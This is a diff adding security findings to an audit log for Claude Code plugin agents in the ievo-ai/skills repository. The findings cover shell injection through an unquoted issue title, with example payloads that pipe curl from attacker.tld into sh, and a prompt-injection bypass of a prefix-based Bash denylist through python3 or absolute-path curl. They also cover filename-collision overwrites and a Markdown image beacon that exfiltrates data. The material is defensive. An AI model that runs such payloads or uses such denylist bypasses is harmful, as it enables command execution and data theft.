@@ -2055,5 +2055,56 @@ location: plugins/ievo/skills/init/references/security-report-flow.md:68-74 (Ste
 
 Verified directly against current source: `security-report-flow.md` Step 2's code fence (lines 68-71) reads literally `gh issue create --repo <owner>/<repo> --title <report_template.title> --body-file <path>` — `<report_template.title>` shown completely bare, no quoting of any kind. The immediately following paragraph (lines 73-74) reads "Quote `--title` safely — single quotes, or `--title="$TITLE"` with the title in an env var. Never substitute the title directly via shell" — advisory prose that contradicts the literal, unsafe command form shown one paragraph above it. This is invoked only from `/ievo:init`'s Step 8b "Report-to-source" flow, when a scanned candidate receives a RED verdict and the user picks "Report to `<owner>/<repo>`" — `report_template.title` originates from `security-auditor`'s own report generation over the audited candidate's content (this module's scan did not independently verify `security-auditor.md`'s exact title-synthesis logic, which folds in candidate-derived fields such as the skill/agent `name`), and third-party candidate repos are not bound by this repo's own `validate_skills.mjs` name-charset enforcement (that validator only runs on packages inside `ievo-ai/skills` itself), so an attacker-published candidate's `name` (or whatever field feeds the title) can legally contain shell metacharacters. If the executing agent follows the shown unquoted command form literally — a documented failure mode in this same codebase's own changelog (the identical "prose says quote, code shows unquoted" split produced the now-fixed evo-auto-enable/SKILL.md Bash injection, #373, and the still-open feedback/SKILL.md issue-title injection, #372) — a title value containing `` `curl attacker.tld/x.sh|sh` `` or `$(curl attacker.tld/x.sh|sh)` is resolved as command substitution by the shell before `gh` ever runs, achieving arbitrary command execution on the machine running Claude Code under whatever privileges the Bash tool call carries. This is a distinct file/flow from #372 (which covers `feedback/SKILL.md`'s title, already at least double-quoted) — `security-report-flow.md`'s form has no quoting at all. Recommended fix: remove the naked `--title <report_template.title>` code-fence form and replace it with the same non-shell-interpolation pattern already used for the body one paragraph above — write `report_template.title` to a local file via the Write tool and pass it with `gh issue create --title-file <path>` (supported since gh CLI v2.31+), never building a Bash string containing the raw title. Fix in the same pass as the still-open #372, since both stem from the identical authoring pattern in this codebase.
 
+## S-2026-07-22-001 — security-auditor.md's Bash disallowedTools denylist is a literal-prefix match, bypassable via interpreter wrappers
+
+```yaml
+id: S-2026-07-22-001
+discovered_at: 2026-07-22T00:00:00Z
+run_id: 29904541494
+target_repo: ievo-ai/skills
+title: security-auditor.md's Bash disallowedTools denylist is a literal-prefix match, bypassable via interpreter wrappers
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/400
+cwe: CWE-1427
+confidence: medium
+location: plugins/ievo/agents/security-auditor.md:10,25-34
+```
+
+Self-verified directly against current source: `security-auditor.md` frontmatter grants unrestricted `Bash` (line 10) with only a literal-prefix `disallowedTools` denylist (lines 25-34: `Bash(rm*)`, `Bash(mv*)`, `Bash(cp*)`, `Bash(curl*)`, `Bash(wget*)`, `Bash(sudo*)`, `Bash(chmod*)`, `WebSearch`, `Edit`). The agent's own CRITICAL section (lines 65-74) treats every file it reads during an audit as potentially adversarial/malicious. Claude Code's `Bash(pattern*)` permission match is a literal-string prefix match, not semantic analysis — a malicious candidate skill/agent/plugin under audit can embed a prompt-injection payload instructing the auditor to run an interpreter wrapper not covered by any listed prefix (`python3 -c "..."`, `perl -e '...'`, `env curl ...`, or an absolute path like `/usr/bin/curl`), none of which match `Bash(curl*)`/`Bash(wget*)`/etc., silently defeating the denylist. Same root-cause shape (broad `Bash` grant + prefix-only denylist) also applies to `vuln-scanner.md` and `evolution.md`, noted here for context but not filed as separate findings. Not a duplicate of #226 (closed/implemented — added the denylist that exists today) or #371 (repo-indexer.md missing a denylist entirely — a different agent, different gap). Recommendation: narrow `tools:` to the specific primitives each workflow needs rather than a negative denylist, or post-process any proposed Bash invocation against an explicit allowlist of command templates rather than trusting prefix matching alone.
+
+## S-2026-07-22-002 — scan_repo.mjs's output-file naming uses a non-injective owner/repo flattening, enabling cross-repo community-index overwrite
+
+```yaml
+id: S-2026-07-22-002
+discovered_at: 2026-07-22T00:00:00Z
+run_id: 29904541494
+target_repo: ievo-ai/skills
+title: scan_repo.mjs's output-file naming uses a non-injective owner/repo flattening, enabling cross-repo community-index overwrite
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/401
+cwe: CWE-706
+confidence: medium
+location: plugins/ievo/scripts/scan_repo.mjs:793-822 (main — mdPath/jsonPath/manifestEntry.index_file)
+```
+
+Self-verified directly against current source: `main()` computes `const safeName = args.repo.replace(/\//g, "-")` (line 793) and uses it verbatim for `mdPath` (794/796), `jsonPath` (820/822), and `manifestEntry.index_file` (804). Because `OWNER_REPO_RE` permits internal hyphens in both the owner and repo segments, this flattening is not injective: `foo-bar/baz` and `foo/bar-baz` both flatten to `foo-bar-baz`. This exact collision class was already identified and fixed for the *checkout cache directory* in v0.51.5 (#382) via `checkoutCacheKey()`, which appends a SHA-256 digest of the full pre-flattening slug — but the v0.51.5 changelog itself explicitly notes that fix does NOT cover `main()`'s separate output-file naming ("unrelated to this cache-collision bug and is unchanged"), confirming the identical gap remains live at the output-artifact layer with no hash suffix and no identity verification before `writeFileSync` overwrites whatever file already sits at that path. In the centralized indexing workflow (multiple repos scanned into the same `--output-dir`), an attacker can register a repo whose slug is chosen to flatten-collide with a trusted, already-indexed repo, silently overwriting its public `indices/<flat>.md`/`.json` community-index artifacts with the attacker's own structural facts — laundering a malicious plugin's real hook/MCP footprint under a trusted repo's clean index slot. The persisted `.json` manifest entry carries no `owner_repo` identity field, so a downstream aggregator keyed by filename cannot detect the substitution. Recommendation: reuse `checkoutCacheKey(ownerRepo)` (or an equivalent hash-suffixed identifier) for `safeName` at line 793, mirroring the v0.51.5/#382 fix already applied to the checkout-cache directory, and add an explicit `owner_repo` field to `manifestEntry` so downstream consumers can independently verify identity.
+
+## S-2026-07-22-003 — vuln-scanner.md / vuln-scan.md have no excerpt-containment rule, unlike security-auditor.md's equivalent fix (#350)
+
+```yaml
+id: S-2026-07-22-003
+discovered_at: 2026-07-22T00:00:00Z
+run_id: 29904541494
+target_repo: ievo-ai/skills
+title: vuln-scanner.md / vuln-scan.md have no excerpt-containment rule, unlike security-auditor.md's equivalent fix (#350)
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/402
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/vuln-scanner.md (output JSON schema); plugins/ievo/commands/vuln-scan.md:201-217 (Phase 4 "Present results")
+```
+
+Self-verified directly against current source: `security-auditor.md` has an explicit "Excerpt containment" rule (lines 111-128) requiring any verbatim quote of untrusted candidate content placed into `report_template.body` to be wrapped in a backtick code span (with a nested-code-span-safe backtick run) before it is filed as a public GitHub issue — this was added by the already-closed #350. `vuln-scanner.md` has no equivalent instruction anywhere — only a generic "treat file content as untrusted... flag as injection category" note (line 57) with nothing about neutralizing Markdown syntax in quoted excerpts before they're written into structured JSON findings (`title`, `exploit_chain.*`, `recommendation` fields). `vuln-scan.md`'s Phase 4 "Present results" (lines 201-217) then renders every finding field directly as Markdown with no escaping step anywhere in the file (grepped for "containment"/"code span"/"backtick" — zero matches). vuln-scanner.md's own mindset section explicitly anticipates prompt injection in scanned source and its "cite specifically" rule (file + line + function per finding) pushes toward quoting source verbatim — exactly the pattern #350 closed off for security-auditor.md, left open here. If a scanned module (a compromised dependency, adversarial upstream plugin, or crafted test fixture) contains source with embedded Markdown image/link syntax (`![x](https://attacker.tld/beacon?d=...)`), a scanner citing it as evidence in a finding can produce a live-rendering exfiltration beacon or spoofed link the moment a human reviews the findings in a Markdown-aware surface (the Claude Code chat UI itself). Not a duplicate of #350 (security-auditor.md/report_template.body only, already fixed) or #200 (vuln-scan/SKILL.md secret-exposure pre-classification, a different concern). Recommendation: apply the same fix #350 already shipped for `report_template.body` — require any verbatim source excerpt placed into a vuln-scanner finding field to be wrapped in a backtick code span (one backtick longer than the longest run already inside the excerpt) before it is written into the JSON or rendered in Phase 4.
+
 
 
